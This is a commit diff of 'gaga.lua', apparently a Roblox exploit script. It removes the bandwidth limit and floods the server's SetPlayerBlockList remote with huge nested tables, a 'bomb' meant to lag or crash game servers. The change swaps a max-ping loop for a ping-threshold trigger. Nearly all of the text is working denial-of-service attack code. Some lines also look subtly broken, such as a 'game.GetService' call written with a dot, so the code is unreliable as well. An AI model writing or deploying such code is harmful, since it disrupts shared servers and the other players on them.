7e1a9b23f97283b6a486dfe02ea3a2323e7733cb
Totallynotgonnalearntohack <turtle10222004@gmail.com>
2023-02-11 22:35:17 -0800

    Update gaga.lua

--- gaga.lua
+++ gaga.lua
@@ -34,67 +34,68 @@ b:Slider("bomb value",{
     bombValue = value
 end)
 
--- Defaults to 200, adjust as necessary
-local maxPing = 200;
-b:Slider("Maximum Ping",{
-    min = 50;
-    max = 2000;
+-- Defaults to 1000, adjust as necessary
+local pingThreshold = 1000;
+b:Slider("ping threshold",{
+    min = 100;
+    max = 5000;
     precise = false;
 },function(value)
-    maxPing = value
+    pingThreshold = value
 end)
 
 b:DestroyGui()
 
 while wait(0.6) do
     if toggle then
-        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
-        local function getmaxvalue(val)
-            local mainvalueifonetable = 499999
-            if type(val) ~= "number" then
-                return nil
-            end
-            local calculateperfectval = (mainvalueifonetable/(val+2))
-            return calculateperfectval
-        end
-        
-        local function bomb(tableincrease, tries)
-            local maintable = {}
-            local spammedtable = {}
-            
-            table.insert(spammedtable, {})
-            z = spammedtable[1]
-            
-            for i = 1, tableincrease do
-                local tableins = {}
-                table.insert(z, tableins)
-                z = tableins
-            end
-            
-            local calculatemax = getmaxvalue(tableincrease)
-            local maximum
-            
-            if calculatemax then
-                maximum = calculatemax
-            else
-                maximum = 999999
-            end
-            
-            for i = 1, maximum do
-                table.insert(maintable, spammedtable)
-            end
-            
-            while true do
-                local ping = game.Workspace.DistributedGameTime.Value
-                if ping >= maxPing then
-                    break
+        local currentPing = game.GetService("NetworkClient").Ping
+        if currentPing > pingThreshold then
+            game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+            local function getmaxvalue(val)
+                local mainvalueifonetable = 499999
+                if type(val) ~= "number" then
+                    return nil
                 end
+                local calculateperfectval = (mainvalueifonetable/(val+2))
+                return calculateperfectval
+            end
+            
+            local function bomb(tableincrease, tries)
+                local maintable = {}
+                local spammedtable = {}
+                
+                table.insert(spammedtable, {})
+                z = spammedtable[1]
+                
+                for i = 1, tableincrease do
+                    local tableins = {}
+                    table.insert(z, tableins)
+                    z = tableins
+                end
+                
+                local calculatemax = getmaxvalue(tableincrease)
+                local maximum
+                
+                if calculatemax then
+                    maximum = calculatemax
+                else
+                    maximum = 999999
+                end
+                
+                for i = 1, maximum do
+                    table.insert(maintable, spammedtable)
+                end
+                
                 for i = 1, tries do
                     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
                 end
             end
+            
+            bomb(tableValue, bombValue)
+        else
+            game:GetService("NetworkClient"):SetOutgoingKBPSLimit(0)
         end
-        
-        bomb(tableValue, bombValue)
+    else
+        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(0)
     end
 end
